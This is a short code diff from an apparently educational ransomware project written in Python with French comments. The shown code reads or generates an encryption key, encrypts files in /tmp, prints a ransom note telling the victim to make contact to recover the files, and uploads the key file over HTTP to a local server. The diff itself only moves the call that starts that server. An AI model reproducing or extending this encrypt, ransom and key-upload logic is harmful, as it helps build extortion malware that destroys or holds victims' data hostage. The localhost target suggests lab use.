@@ -155,7 +155,6 @@ if __name__ == '__main__':
             rware.read_key(keyfile)
             rware.crypt_tmp(local_tmp, encrypted=True)
     else:
-        server.launch_server(True) #Lancement du serveur Web
 
         print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE MAIN SINON VIS FICHIERS SERONT PERDUS.")    
         rware.generate_key()
@@ -166,6 +165,7 @@ if __name__ == '__main__':
         url = '127.0.0.1:8080'
         files = {'file': open('keyfile', 'rb')}
 
+        server.launch_server(True) #Lancement du serveur Web
         r = requests.post(url, files=files)
 
         #r = requests.get(url='127.0.0.1',params =keyfile, port 8080)
